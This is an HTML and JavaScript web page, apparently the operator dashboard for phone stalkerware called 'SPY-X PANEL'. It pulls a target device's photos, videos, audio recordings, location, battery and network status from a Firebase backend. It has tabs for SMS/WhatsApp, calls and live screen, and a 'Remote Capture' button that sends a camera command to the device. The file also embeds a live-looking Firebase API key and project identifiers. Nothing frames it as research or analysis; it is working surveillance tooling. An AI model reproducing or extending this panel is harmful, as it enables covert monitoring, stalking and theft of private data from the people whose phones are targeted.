<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ULTRA SPY DASHBOARD - FINAL UPDATE</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { background-color: #020617; color: #f1f5f9; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
        .sidebar-btn { transition: 0.3s; border-radius: 8px; margin-bottom: 5px; }
        .sidebar-btn:hover { background: #1e293b; color: #3b82f6; }
        .active-tab { background: #1e293b; color: #3b82f6; border-left: 4px solid #3b82f6; }
        .section-card { display: none; animation: fadeIn 0.4s ease-in-out; }
        .visible { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .media-container { background: #0f172a; border: 1px solid #1e293b; border-radius: 12px; padding: 15px; }
    </style>
</head>
<body class="flex h-screen w-screen">

    <div class="w-72 bg-slate-950 border-r border-slate-800 flex flex-col p-6">
        <div class="mb-10 text-center">
            <h1 class="text-2xl font-black text-blue-500 tracking-tighter">SPY-X PANEL</h1>
            <p class="text-[10px] text-slate-500 uppercase tracking-widest">Advanced Monitoring System</p>
        </div>

        <nav class="flex-1 space-y-1">
            <button onclick="switchTab('files')" id="tab-files" class="sidebar-btn active-tab w-full flex items-center gap-4 p-4 text-sm font-medium">
                <i class="fas fa-folder-open w-5"></i> File Manager
            </button>
            <button onclick="switchTab('comms')" id="tab-comms" class="sidebar-btn w-full flex items-center gap-4 p-4 text-sm font-medium">
                <i class="fas fa-comment-alt w-5"></i> SMS & WhatsApp
            </button>
            <button onclick="switchTab('calls')" id="tab-calls" class="sidebar-btn w-full flex items-center gap-4 p-4 text-sm font-medium">
                <i class="fas fa-phone-alt w-5"></i> Calls & Contacts
            </button>
            <button onclick="switchTab('location')" id="tab-location" class="sidebar-btn w-full flex items-center gap-4 p-4 text-sm font-medium">
                <i class="fas fa-map-marked-alt w-5"></i> Live Location
            </button>
            <button onclick="switchTab('screen')" id="tab-screen" class="sidebar-btn w-full flex items-center gap-4 p-4 text-sm font-medium">
                <i class="fas fa-desktop w-5"></i> Live Screen
            </button>
            
            <div class="pt-6 mt-6 border-t border-slate-800">
                <button onclick="sendCommand('camera')" class="w-full bg-red-600/10 text-red-500 hover:bg-red-600 hover:text-white p-4 rounded-xl flex items-center gap-4 transition font-bold">
                    <i class="fas fa-camera"></i> Remote Capture
                </button>
            </div>
        </nav>
        
        <div class="mt-auto p-4 bg-slate-900/50 rounded-2xl border border-slate-800">
            <div class="flex items-center gap-3">
                <div id="status-dot" class="h-3 w-3 bg-red-500 rounded-full"></div>
                <span id="status-label" class="text-xs font-bold uppercase">Device Offline</span>
            </div>
            <p class="text-[10px] text-slate-400 mt-1">Target ID: spycontrol-31530</p>
        </div>
    </div>

    <div class="flex-1 flex flex-col overflow-hidden bg-[#020617]">
        <header class="h-20 border-b border-slate-800 flex items-center justify-between px-10">
            <div id="status-text" class="font-semibold text-lg">File Manager Overview</div>
            <div class="flex gap-4 text-sm">
                <div class="bg-slate-900 px-4 py-2 rounded-lg border border-slate-800"><i class="fas fa-battery-three-quarters text-green-400 mr-2"></i> <span id="stat-battery">--%</span></div>
                <div class="bg-slate-900 px-4 py-2 rounded-lg border border-slate-800"><i class="fas fa-wifi text-blue-400 mr-2"></i> <span id="stat-net">--</span></div>
            </div>
        </header>

        <main class="flex-1 p-10 overflow-y-auto">
            <section id="section-files" class="section-card visible">
                <div class="grid grid-cols-3 gap-6 mb-10">
                    <div onclick="window.fetchFromFirebase('photos')" class="media-container cursor-pointer hover:border-blue-500 transition group text-center">
                        <i class="fas fa-images text-3xl text-blue-500 mb-3 group-hover:scale-110 transition"></i>
                        <h3 class="font-bold">Photos</h3>
                    </div>
                    <div onclick="window.fetchFromFirebase('videos')" class="media-container cursor-pointer hover:border-purple-500 transition group text-center">
                        <i class="fas fa-play-circle text-3xl text-purple-500 mb-3 group-hover:scale-110 transition"></i>
                        <h3 class="font-bold">Videos</h3>
                    </div>
                    <div onclick="window.fetchFromFirebase('audios')" class="media-container cursor-pointer hover:border-green-500 transition group text-center">
                        <i class="fas fa-microphone text-3xl text-green-500 mb-3 group-hover:scale-110 transition"></i>
                        <h3 class="font-bold">Audios</h3>
                    </div>
                </div>
                <div id="media-viewer" class="grid grid-cols-4 gap-4 p-6 bg-slate-950 rounded-3xl border border-slate-800 min-h-[300px]">
                    <div class="col-span-4 text-center text-slate-600 mt-20">Click a category above to load files.</div>
                </div>
            </section>

            <section id="section-comms" class="section-card">
                <div id="comms-list" class="space-y-4">
                    <p class="text-center text-slate-500">No new messages detected.</p>
                </div>
            </section>

            <section id="section-location" class="section-card">
                <div class="h-[500px] w-full bg-slate-900 rounded-3xl border border-slate-800 relative overflow-hidden">
                    <div id="map-info" class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 text-center z-10">
                        <i class="fas fa-map-marker-alt text-4xl text-red-500 mb-4 animate-bounce"></i>
                        <p id="loc-text" class="font-bold font-mono">Waiting for Lat/Long...</p>
                    </div>
                </div>
            </section>
        </main>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
        import { getStorage, ref as sRef, listAll, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBSAfGVOM3-w7_MimlfKjgT5e4Dfu8-Bpk",
            authDomain: "spycontrol-31530.firebaseapp.com",
            projectId: "spycontrol-31530",
            storageBucket: "spycontrol-31530.firebasestorage.app",
            messagingSenderId: "447032169790",
            appId: "1:447032169790:web:0a46a03bffa745f181886f",
            measurementId: "G-LKV1QSJTQ3"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const storage = getStorage(app);

        // --- REALTIME SYNC (SMS, Battery, Location) ---
        onValue(ref(db, 'device_status'), (snap) => {
            const data = snap.val();
            if(data) {
                document.getElementById('stat-battery').innerText = (data.battery || '--') + '%';
                document.getElementById('stat-net').innerText = data.network || '--';
                document.getElementById('status-dot').className = 'h-3 w-3 bg-green-500 rounded-full animate-pulse';
                document.getElementById('status-label').innerText = 'Device Online';
            }
        });

        onValue(ref(db, 'location'), (snap) => {
            const loc = snap.val();
            if(loc) document.getElementById('loc-text').innerText = `LAT: ${loc.lat}, LONG: ${loc.lng}`;
        });

        // --- FILE MANAGER FETCH ---
        window.fetchFromFirebase = function(type) {
            const viewer = document.getElementById('media-viewer');
            viewer.innerHTML = '<div class="col-span-4 text-center py-20"><i class="fas fa-spinner fa-spin text-3xl text-blue-500"></i></div>';
            
            const listRef = sRef(storage, type + '/');
            listAll(listRef).then(res => {
                viewer.innerHTML = '';
                if(res.items.length === 0) viewer.innerHTML = '<div class="col-span-4 text-center py-20">Folder is empty.</div>';
                res.items.forEach(item => {
                    getDownloadURL(item).then(url => {
                        if(type === 'photos') {
                            viewer.innerHTML += `<div class="bg-slate-900 p-2 rounded-xl border border-slate-800 relative group"><img src="${url}" class="h-32 w-full object-cover rounded-lg"><a href="${url}" download class="absolute bottom-2 right-2 bg-blue-600 p-2 rounded-full opacity-0 group-hover:opacity-100 transition"><i class="fas fa-download text-xs"></i></a></div>`;
                        } else if(type === 'videos') {
                            viewer.innerHTML += `<div class="col-span-2 bg-slate-900 p-2 rounded-xl border border-slate-800"><video src="${url}" controls class="w-full rounded-lg h-32"></video><a href="${url}" download class="block text-center text-xs mt-2 text-blue-400">Download Video</a></div>`;
                        } else {
                            viewer.innerHTML += `<div class="col-span-4 bg-slate-900 p-4 rounded-xl border border-slate-800 flex justify-between"><audio src="${url}" controls class="flex-1 mr-4"></audio><a href="${url}" download class="bg-green-600 p-3 rounded-full"><i class="fas fa-download"></i></a></div>`;
                        }
                    });
                });
            });
        };

        // --- COMMANDS ---
        window.sendCommand = function(cmd) {
            set(ref(db, 'commands'), { action: cmd, time: Date.now() });
            alert("Command Sent: " + cmd.toUpperCase());
        };
    </script>

    <script>
        function switchTab(tabId) {
            document.querySelectorAll('.section-card').forEach(s => s.classList.remove('visible'));
            document.querySelectorAll('.sidebar-btn').forEach(b => b.classList.remove('active-tab'));
            document.getElementById('section-' + tabId).classList.add('visible');
            document.getElementById('tab-' + tabId).classList.add('active-tab');
            document.getElementById('status-text').innerText = tabId.toUpperCase() + " CONTROL";
        }
    </script>
</body>
</html>
